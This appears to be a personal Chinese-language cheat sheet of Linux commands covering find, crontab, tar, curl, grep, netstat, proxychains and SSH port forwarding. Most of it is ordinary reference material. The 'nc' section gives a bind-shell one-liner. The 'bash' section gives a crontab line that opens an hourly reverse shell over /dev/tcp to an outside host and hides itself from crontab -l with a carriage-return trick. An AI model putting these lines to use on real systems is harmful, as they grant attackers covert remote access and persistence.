# linux 命令

## nc

 nc -FNlp 80  < 2.txt

### 正向shell

```
mkfifo /tmp/fifo
cat /tmp/fifo | /bin/bash -i 2>&1 | nc -l 10000 > /tmp/fifo
```





## find

### 语法

```
find   path   -option   [   -print ]   [ -exec   -ok   command ]   {} \;
```

**参数说明** :

find 根据下列规则判断 path 和 expression，在命令列上第一个 - ( ) , ! 之前的部份为 path，之后的是 expression。如果 path 是空字串则使用目前路径，如果 expression 是空字串则使用 -print 为预设 expression。

expression 中可使用的选项有二三十个之多，在此只介绍最常用的部份。

-mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件

-amin n : 在过去 n 分钟内被读取过

-anewer file : 比文件 file 更晚被读取过的文件

-atime n : 在过去n天内被读取过的文件

-cmin n : 在过去 n 分钟内被修改过

-cnewer file :比文件 file 更新的文件

-ctime n : 在过去n天内被修改过的文件

-empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name

-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写

-name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写

-size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。-type c : 文件类型是 c 的文件。

d: 目录

c: 字型装置文件

b: 区块装置文件

p: 具名贮列

f: 一般文件

l: 符号连结

s: socket

-pid n : process id 是 n 的文件

你可以使用 ( ) 将运算式分隔，并使用下列运算。

exp1 -and exp2

! expr

-not expr

exp1 -or exp2

exp1, exp2

## crontab

**执行前提:启动cron服务**

Linux crontab是用来定期执行程序的命令。

### 语法

```
crontab [ -u user ] file
```

或

```
crontab [ -u user ] { -l | -r | -e }
```

crontab 是用来让使用者在固定时间或固定间隔执行程序之用，换句话说，也就是类似使用者的时程表。

-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。

**参数说明**：

- -e : 执行文字编辑器来设定时程表，内定的文字编辑器是 VI，如果你想用别的文字编辑器，则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe)
- -r : 删除目前的时程表
- -l : 列出目前的时程表

时程表的格式如下：

```
f1 f2 f3 f4 f5 program
```

- 其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。
- 当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推
- 当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推
- 当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推
- 当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行，其馀类推

使用者也可以将所有的设定先存放在文件中，用 crontab file 的方式来设定时程表。

## mkdir

### 选项 

```
-Z：设置安全上下文，当使用SELinux时有效；
-m<目标属性>或--mode<目标属性>建立目录的同时设置目录的权限；
-p或--parents 若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录；
--version 显示版本信息。
```

## tcpdump

```
sudo tcpdump -nn -i lo tcp dst port 9000
```

指定本地回环网卡,获取9000端口的数据包

解析包数据:

`tcpdump -q -XX -vvv -nn -i lo tcp dst port 9000`

## strace命令

**trace命令**是一个集诊断、调试、统计与一体的工具，我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。当然strace与专业的调试工具比如说[gdb](http://man.linuxde.net/gdb)之类的是没法相比的，因为它不是一个专业的调试器。

strace的最简单的用法就是执行一个指定的命令，在指定的命令结束之后它也就退出了。在命令执行的过程中，strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值。

### 语法 

```
strace  [  -dffhiqrtttTvxx  ] [ -acolumn ] [ -eexpr ] ...
    [ -ofile ] [-ppid ] ...  [ -sstrsize ] [ -uusername ]
    [ -Evar=val ] ...  [ -Evar  ]...
    [ command [ arg ...  ] ]

strace  -c  [ -eexpr ] ...  [ -Ooverhead ] [ -Ssortby ]
    [ command [ arg...  ] ]
```

### 选项

```
-c 统计每一系统调用的所执行的时间,次数和出错的次数等.
-d 输出strace关于标准错误的调试信息.
-f 跟踪由fork调用所产生的子进程.
-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号.
-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪.
-h 输出简要的帮助信息.
-i 输出系统调用的入口指针.
-q 禁止输出关于脱离的消息.
-r 打印出相对时间关于,,每一个系统调用.
-t 在输出中的每一行前加上时间信息.
-tt 在输出中的每一行前加上时间信息,微秒级.
-ttt 微秒级输出,以秒了表示时间.
-T 显示每一调用所耗的时间.
-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出.
-V 输出strace的版本信息.
-x 以十六进制形式输出非标准字符串
-xx 所有字符串以十六进制形式输出.
-a column 设置返回值的输出位置.默认 为40.
-e expr 指定一个表达式,用来控制如何跟踪.格式：[qualifier=][!]value1[,value2]...
qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如:-eopen等价于 -e trace=open,表示只跟踪open调用.而-etrace!=open 表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none. 注意有些shell使用!来执行历史记录里的命令,所以要使用\\.
-e trace=set 只跟踪指定的系统 调用.例如:-e trace=open,close,rean,write表示只跟踪这四个系统调用.默认的为set=all.
-e trace=file 只跟踪有关文件操作的系统调用.
-e trace=process 只跟踪有关进程控制的系统调用.
-e trace=network 跟踪与网络有关的所有系统调用.
-e strace=signal 跟踪所有与系统信号有关的 系统调用
-e trace=ipc 跟踪所有与进程通讯有关的系统调用
-e abbrev=set 设定strace输出的系统调用的结果集.-v 等与 abbrev=none.默认为abbrev=all.
-e raw=set 将指定的系统调用的参数以十六进制显示.
-e signal=set 指定跟踪的系统信号.默认为all.如 signal=!SIGIO(或者signal=!io),表示不跟踪SIGIO信号.
-e read=set 输出从指定文件中读出 的数据.例如: -e read=3,5
-e write=set 输出写入到指定文件中的数据.
-o filename 将strace的输出写入文件filename
-p pid 跟踪指定的进程pid.
-s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出.
-u username 以username的UID和GID执行被跟踪的命令
```

## bash



```bash
(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/dns.wooyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
```

## ulimit

它具有一套参数集，用来为由它生成的 shell 进程及其子进程的资源使用设置限制，针对的是 Per-Process 而非 Per-User 。

ulimit 用于 shell 启动进程所占用的资源，可以用来设置系统的限制，通过 `ulimit -a` 可以查看当前的资源限制，如果通过命令行设置，则只对当前的终端生效。

## vim

[http://vimcdoc.sourceforge.net](http://vimcdoc.sourceforge.net/)

从交换文件恢复:

vim -r filename



## tar

```shell
tar [-j|-z][cv][-f 建立的档名]  filename<==打包与压缩
tar [-j|-z][tv][-f 建立的档名] <=查看档名
tar [-j|-z][xv][-f 建立的档名] <==解压缩
```

参数和选项

```
-c :建立打包档案,可配合-v 来查看过程中被打包的档名
-t :查看打包档案的内容含有哪些档名,重点在查看档名
-x :解打包或解压缩的功能,可以配合-C 在特定的目录解开。但是,-c,-t,-x不可以同时出现
-j :通过bzip2的支持进行压缩/解压:文件名最好为:*.tar.bz2
-z :通过gzip的支持进行压缩/解压缩:此时档名最好为*.tar.gz
-v :在压缩/解压缩的过程中,将正在处理的文件名显示出来
-f filename : -f后面要立刻接被处理的档名!建议-f单独写一个选项
-C 目录 :这个选项用在解压缩,若要在特定的目录解压缩,可以使用这个选项
-p :保留备份数据的原本权限和属性,常用于备份(-c)重要的配置文件
-P :保留绝对路径,即允许备份数据中包含根目录存在
--exclude=FILE :在压缩的过程中不要将FILE打包
```



### 常用命令

- 压缩 tar -zcv -f filename.tar.gz 目录或文件
- 查询 tar -ztv -f filename.tar.gz
- 解压缩 tar -zxv -f filename -C 欲解压路径

- 解压包下某个特定文/文件夹 tar -zxv -f filename wanted
  eg. 想要解压a.tar.gz中的file/test 则运行如下命令:`tar -zxv -f a.tar.gz file/test` 

### 常见问题

如果你想用绝对路径解压和压缩的话，那么无论在解压还是压缩都要加个-P



## mysqldump

```shell
mysqldump [OPTIONS] database [tables]
mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]
mysqldump [OPTIONS] --all-databases [OPTIONS]
```

## mysql

`  mysql --user=user_name --password db_name `

`  mysql db_name < script.sql > output.tab `



## gzip

`Usage: gzip [OPTION]... [FILE]...`



解压 gzip -dv xxx.gz

解压到标准输出并不变动原文件

  -c, --stdout      write on standard output, keep original files unchanged
  -d, --decompress  decompress
  -f, --force       force overwrite of output file and compress links
  -h, --help        give this help
  -k, --keep        keep (don't delete) input files
  -l, --list        list compressed file contents
  -L, --license     display software license
  -n, --no-name     do not save or restore the original name and time stamp
  -N, --name        save or restore the original name and time stamp
  -q, --quiet       suppress all warnings
  -r, --recursive   operate recursively on directories
  -S, --suffix=SUF  use suffix SUF on compressed files
  -t, --test        test compressed file integrity
  -v, --verbose     verbose mode
  -V, --version     display version number
  -1, --fast        compress faster
  -9, --best        compress better
  --rsyncable       Make rsync-friendly archive

With no FILE, or when FILE is -, read standard input.

## ldd

 ldd命令可以查看一个可执行程序依赖的共享库 



## alias

 alias cp='cp -i' 

列出目前所有的别名设置:`alias -p`

### alias永久化

 <1>.若要每次登入就自动生效别名，则把别名加在/etc/profile或~/.bashrc中。然后# source ~/.bashrc
<2>.若要让每一位用户都生效别名，则把别名加在/etc/bashrc最后面，然后# source /etc/bashrc 

### 删除别名 unalias

unalias 'cat'



## curl

 https://www.ruanyifeng.com/blog/2019/09/curl-reference.html 

### get请求



####   **-G**

`-G`参数用来构造 URL 的查询字符串。

> ```bash
> $ curl -G -d 'q=kitties' -d 'count=20' https://google.com/search
> ```

上面命令会发出一个 GET 请求，实际请求的 URL 为`https://google.com/search?q=kitties&count=20`。如果省略`--G`，会发出一个 POST 请求。

如果数据需要 URL 编码，可以结合`--data--urlencode`参数。

> ```bash
> $ curl -G --data-urlencode 'comment=hello world' https://www.example.com
> ```

### post请求



#### -d

`-d`参数用于发送 POST 请求的数据体。

> ```bash
> $ curl -d'login=emma＆password=123'-X POST https://google.com/login
> # 或者
> $ curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login
> ```

使用`-d`参数以后，HTTP 请求会自动加上标头`Content-Type : application/x-www-form-urlencoded`。并且会自动将请求转为 POST 方法，因此可以省略`-X POST`。

`-d`参数可以读取本地文本文件的数据，向服务器发送。

> ```bash
> $ curl -d '@data.txt' https://google.com/login
> ```

上面命令读取`data.txt`文件的内容，作为数据体向服务器发送。

####  **--data-urlencode**

`--data-urlencode`参数等同于`-d`，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。

> ```bash
> $ curl --data-urlencode 'comment=hello world' https://google.com/login
> ```

上面代码中，发送的数据`hello world`之间有一个空格，需要进行 URL 编码。

### 修改指定http头

`-e`参数用来设置 HTTP 的标头`Referer`，表示请求的来源。

> ```bash
> curl -e 'https://google.com?q=example' https://www.example.com
> ```

上面命令将`Referer`标头设为`https://google.com?q=example`。

`-H`参数可以通过直接添加标头`Referer`，达到同样效果。

> ```bash
> curl -H 'Referer: https://google.com?q=example' https://www.example.com
> ```

### 设置和接受cookie

#### -b

`-b`参数用来向服务器发送 Cookie。

> ```bash
> $ curl -b 'foo=bar' https://google.com
> ```

上面命令会生成一个标头`Cookie: foo=bar`，向服务器发送一个名为`foo`、值为`bar`的 Cookie。

> ```bash
> $ curl -b 'foo1=bar' -b 'foo2=baz' https://google.com
> ```

上面命令发送两个 Cookie。

> ```bash
> $ curl -b cookies.txt https://www.google.com
> ```

上面命令读取本地文件`cookies.txt`，里面是服务器设置的 Cookie（参见`-c`参数），将其发送到服务器。

#### -c

`-c`参数将服务器设置的 Cookie 写入一个文件。

> ```bash
> $ curl -c cookies.txt https://www.google.com
> ```

上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件`cookies.txt`。

### 设置代理

####  **-x**

`-x`参数指定 HTTP 请求的代理。

> ```bash
> $ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com
> ```

上面命令指定 HTTP 请求通过`myproxy.com:8080`的 socks5 代理发出。

如果没有指定代理协议，默认为 HTTP。

> ```bash
> $ curl -x james:cats@myproxy.com:8080 https://www.example.com
> ```

上面命令中，请求的代理使用 HTTP 协议。



## find

### 根据权限查找文件

#### -perm mode

mode 可以是代表权限的八进制数字（777、666 …）也可以是权限符号（u=x，a=r+x）。

在深入之前，我们就以下三点详细说明 mode 参数。

1. 如果我们不指定任何参数前缀，它将会寻找**具体**权限的文件。
2. 如果我们使用 `-` 参数前缀， 寻找到的文件至少拥有 mode 所述的权限，而不是具体的权限（大于或等于此权限的文件都会被查找出来）。
3. 如果我们使用 `/` 参数前缀，那么所有者、组或者其他人任意一个应当享有此文件的权限。

### 基于符号的文件权限查找文件

在下面的例子中，我们使用例如 `u`（所有者）、`g`（用户组） 和 `o`（其他） 的符号表示法。我们也可以使用字母 `a` 代表上述三种类型。我们可以通过特指的 `r` （读）、 `w` （写）、 `x` （执行）分别代表它们的权限。

例如，寻找用户组中拥有 `写` 权限的文件，执行：

```shell
find -perm -g=w
```

你可以等效使用 `=` 或 `+` 两种符号标识。例如，下列两行相同效果的代码。

```
find -perm -g=w
find -perm -g+w
```

查找文件所有者中拥有写权限的文件，执行：

```
find -perm -u=w
```

查找所有用户中拥有写权限的文件，执行：

```
find -perm -a=w
```

查找所有者和用户组中同时拥有写权限的文件，执行：

```
find -perm -g+w,u+w
```

上述命令等效与 `find -perm -220`。

查找所有者或用户组中拥有写权限的文件，执行：

```
find -perm /u+w,g+w
```

或者,

```
find -perm /u=w,g=w
```

上述命令等效于 `find -perm /220`。



### -type指定类型

 f 普通文件
l 符号连接
d 目录
c 字符设备
b 块设备
s 套接字
p Fifo 

`-type f` 文件

`-type d`目录



### 指定所有用户或组

找出当前目录用户tom拥有的所有文件 `find . -type f -user tom`

 找出当前目录用户组sunk拥有的所有文件` find . -type f -group sunk`



### -exec 对找到的内容执行命令

`find -perm -o=rwx -type d -exec ls {} \; `

注意`\`和`}`之间的空格



## chmod

**chmod命令**用来变更文件或目录的权限。在UNIX系统家族里，文件或目录权限的控制分别以读取、写入、执行3种一般权限来区分，另有3种特殊权限可供运用。用户可以使用chmod指令去变更文件与目录的权限，设置方式采用文字或数字代号皆可。符号连接的权限无法变更，如果用户对符号连接修改权限，其改变会作用在被连接的原始文件。

权限范围的表示法如下：

`u` User，即文件或目录的拥有者；
`g` Group，即文件或目录的所属群组；
`o` Other，除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围；
`a` All，即全部的用户，包含拥有者，所属群组以及其他用户；
`r` 读取权限，数字代号为“4”;
`w` 写入权限，数字代号为“2”；
`x` 执行或切换权限，数字代号为“1”；
`-` 不具任何权限，数字代号为“0”；
`s` 特殊功能说明：变更文件或目录的权限。

### 语法 

```
chmod(选项)(参数)
```

### 选项 

```
-c或——changes：效果类似“-v”参数，但仅回报更改的部分；
-f或--quiet或——silent：不显示错误信息；
-R或——recursive：递归处理，将指令目录下的所有文件及子目录一并处理；
-v或——verbose：显示指令执行过程；
--reference=<参考文件或目录>：把指定文件或目录的所属群组全部设成和参考文件或目录的所属群组相同；
<权限范围>+<权限设置>：开启权限范围的文件或目录的该选项权限设置；
<权限范围>-<权限设置>：关闭权限范围的文件或目录的该选项权限设置；
<权限范围>=<权限设置>：指定权限范围的文件或目录的该选项权限设置；
```



## grep

格式

       grep [OPTIONS] PATTERN [FILE...]
       grep [OPTIONS] -e PATTERN ... [FILE...]
       grep [OPTIONS] -f FILE ... [FILE...]


 当命令匹配到执行命令时指定的模式时，grep会将包含模式的一行输出，但是并不对原文件内容进行修改。 





### -l 显示匹配文件文件内容的文件名

```shell
grep -l linuxtechi /etc/passwd /etc/shadow /etc/fstab /etc/mtab
/etc/passwd
/etc/shadow
```



### -n 在文件中查找指定模式并显示匹配行的行号



###  -v 输出不包含指定模式的行



### -r 递归地查找特定模式

` grep -r linuxtechi /etc/ `

 上面的命令将会递归的在/etc目录中查找“linuxtechi”单词 



### -i 忽略字符大小写



### -e 查找多个模式

例如我想在日志里查找带GET或者POST请求的时候

输入`grep  -e"GET" -e "POST"`

###  -B 输出匹配行的前n行



###  -A 输出匹配行的后n行



### -C 查看搜索结果前后N行



### -f 指定某个文件的内容作为搜索参数



## netstat

 netstat命令各个参数说明如下：
　　-t : 指明显示TCP端口
　　-u : 指明显示UDP端口
　　-l : 仅显示监听套接字(所谓套接字就是使应用程序能够读写与收发通讯协议(protocol)与资料的程序)
　　-p : 显示进程标识符和程序名称，每一个套接字/端口都属于一个程序。
　　-n : 不进行DNS轮询，显示IP(可以加速操作)
即可显示当前服务器上所有端口及进程服务，于grep结合可查看某个具体端口及服务情况··
netstat -ntlp   //查看当前所有tcp端口·
netstat -ntulp |grep 80   //查看所有80端口使用情况·
netstat -ntulp | grep 3306   //查看所有3306端口使用情况·





## proxychains


```
vim /etc/proxychains.conf
# socks5 127.0.0.1 1080 最后 ProxyList 处更改
# 格式：type host port [user pass]
```



```shell
\# 单次代理
proxychains git clone https://github.com/haad/proxychains.git

\# 代理终端上运行的所有程序
proxychains zsh 
```



## ssh

### 功能

远程连接,端口转发,搭建代理服务器

### 选项介绍



-n 将 stdio 重定向到 /dev/null，与 -f 配合使用
 -T 不分配 TTY 只做代理用
 -q 安静模式，不输出 错误/警告 信息
 -f 后台连接
 -N 连接后不取得shell
 -C 启动压缩，加快速度
 （如不理解参数可以去掉他们看效果）
 -L 本地转发

-R 远程转发

 -D socks代理
-g 监听所有地址，允许其他主机连接。 

-p ssh所在端口,默认22

### 远程登陆

#### 基本命令

```shell
ssh -p 2222 user@host
```



#### 免密登陆

1. 用 ssh-keygen 生成密钥, 在$HOME/.ssh/目录下，会新生成两个文件：id_rsa.pub和id_rsa。前者是你的公钥，后者是你的私钥 
2. 将公钥传输到远程主机 用`ssh-copy-id user@host`, 或者手动将公钥放到` ~/.ssh/id_rsa.pub `下
3. 重启服务`/etc/init.d/ssh restart`

如果不行,则修改远程主机的 /etc/ssh/sshd_config 

```shell
　　RSAAuthentication yes
　　PubkeyAuthentication yes
　　AuthorizedKeysFile .ssh/authorized_keys
```





### 代理服务器



假定我们要让8080端口的数据，都通过SSH传向远程主机，命令就这样写：

`ssh -D 8080 user@host`

SSH会建立一个socket，去监听本地的8080端口。一旦有数据传向那个端口，就自动把它转移到SSH连接上面，发往远程主机。



### 本地端口转发



```SHELL
ssh -C -g -L <local port>:<remote host>:<remote port> <SSH hostname>
ssh -C -g -L 1234:192.168.99.125:3389 root@192.168.99.199
```



 直接访问**本机**开启监听的1234端口，等于通过**远程主机**192.168.99.199来访问**远程主机**192.168.99.125上的3389端口 



### 远程端口转发

#### 

```shell
ssh -R <local port>:<remote host>:<remote port> <SSH hostname

ssh -TN  -R 60001:localhost:8888 ccreater@39.108.164.219
```

直接访问**远程主机**上开启监听的60001端口就相当于通过**本机**来访问localhost(本机)上的8888端口。

需要修改vps上的/etc/ssh/sshd_config文件，启用 VPS sshd 的 `GatewayPorts` 参数，set to `yes` or `clientspecified`，允许任意请求地址，通过转发的端口访问内网机器。

并对外开放端口

```shell
sudo ufw allow 8899    # 防火墙打开端口，记得打开阿里云官网的防火墙
```

### ssh保持在线

ssh会话会在空闲一段时间后自动僵死，但是要注意**进程**和**连接**仍在。虽然客户端也可以设置心跳检测，但在服务端设置更方便。
 修改/etc/ssh/sshd_config



```bash
ClientAliveInterval 30#意思是每个30秒发送一次心跳请求
ClientAliveCountMax 6#超过6次心跳失败则自动终止连接
```

## 